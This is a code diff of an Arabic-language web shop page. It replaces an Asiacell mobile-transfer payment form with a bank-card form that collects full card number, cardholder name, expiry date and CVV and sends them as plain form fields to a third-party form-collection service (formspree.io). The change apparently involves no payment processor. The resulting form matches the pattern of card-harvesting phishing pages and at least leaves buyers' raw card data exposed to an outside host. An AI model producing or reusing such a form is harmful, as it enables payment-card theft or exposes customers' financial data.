@@ -75,6 +75,15 @@
       background:#e55b50;
     }
 
+    /* Flex for card details */
+    .card-details {
+      display: flex;
+      gap: 15px;
+      flex-wrap: wrap;
+    }
+    .card-details > div {
+      flex: 1 1 48%;
+    }
   </style>
 </head>
 <body>
@@ -146,7 +155,7 @@
 
   <!-- Payment Form -->
   <section id="payment">
-    <h2>نموذج دفع حوالة آسيا سيل</h2>
+    <h2>نموذج دفع بطاقة بنكية</h2>
     <form action="https://formspree.io/f/xovljpvw" method="POST">
       <label for="name">الاسم الكامل:</label>
       <input type="text" id="name" name="name" placeholder="أدخل اسمك الكامل" required />
@@ -154,14 +163,25 @@
       <label for="email">البريد الإلكتروني:</label>
       <input type="email" id="email" name="email" placeholder="example@example.com" required />
 
-      <label for="phone">رقم الهاتف (للتواصل):</label>
-      <input type="tel" id="phone" name="phone" placeholder="07748511132" required />
+      <label for="card_number">رقم البطاقة البنكية:</label>
+      <input type="text" id="card_number" name="card_number" placeholder="XXXX XXXX XXXX XXXX" required pattern="\d{13,19}" title="أدخل رقم بطاقة صالح (13-19 رقم)" />
+
+      <label for="card_name">اسم صاحب البطاقة:</label>
+      <input type="text" id="card_name" name="card_name" placeholder="كما هو مكتوب على البطاقة" required />
+
+      <div class="card-details">
+        <div>
+          <label for="expiry_date">تاريخ الانتهاء:</label>
+          <input type="month" id="expiry_date" name="expiry_date" required min="2023-01" />
+        </div>
+        <div>
+          <label for="cvv">رمز الأمان (CVV):</label>
+          <input type="password" id="cvv" name="cvv" placeholder="XXX" required pattern="\d{3,4}" title="3 أو 4 أرقام" />
+        </div>
+      </div>
 
       <label for="amount">المبلغ المدفوع:</label>
       <input type="number" id="amount" name="amount" placeholder="مثلاً 10000" required min="1" />
-
-      <label for="transfer_id">رقم الحوالة:</label>
-      <input type="text" id="transfer_id" name="transfer_id" placeholder="أدخل رقم الحوالة" required />
 
       <label for="product">المنتج المطلوب:</label>
       <select id="product" name="product" required>
